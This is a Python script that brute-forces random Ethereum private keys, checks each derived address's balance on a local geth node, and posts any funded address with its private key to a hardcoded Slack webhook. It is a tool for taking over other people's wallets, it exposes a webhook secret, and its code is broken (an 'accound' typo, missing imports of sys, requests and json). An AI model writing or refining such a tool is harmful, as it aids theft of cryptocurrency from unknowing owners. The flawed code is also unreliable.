#!/usr/bin/python3

import time
from eth_account import Account
import secrets
from web3 import Web3

w3 = Web3(Web3.IPCProvider('/home/ubuntu/.ethereum/geth.ipc'))

result = []

def get_balance(address):
  balance = None
  while balance is None:
    try:
      balance = w3.eth.get_balance(address)
      time.sleep(1)
    except Exception as e:
      print(e)
  return balance

def run():
  while True:
    private_key = '0x' + secrets.token_hex(32)
    account = Account.from_key(private_key)
    print(f'trying {account.address} - {private_key}')
    balance = get_balance(account.address)
    if balance > 0:
      print(f'found one with balance = {balance}')
      result.append([account.address, private_key])
      send_notification(accound.address, private_key)


def send_notification(pub, priv):
  url = "https://hooks.slack.com/services/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"
  slack_data = {
    'text': '<!channel> found new key.',
    "attachments": [
      {
        "color": "#9733EE",
        "fields": [
          {
            "title": "Public",
            "value": pub,
            "short": "false",
          },
          {
            "title": "Private",
            "value": priv,
            "short": "false",
          },
        ]
      }
    ]
  }
  byte_length = str(sys.getsizeof(slack_data))
  headers = {'Content-Type': "application/json", 'Content-Length': byte_length}
  response = requests.post(url, data=json.dumps(slack_data), headers=headers)
  if response.status_code != 200:
    raise Exception(response.status_code, response.text)

if __name__ == '__main__':
  run()
#  send_notification('hello', 'world')
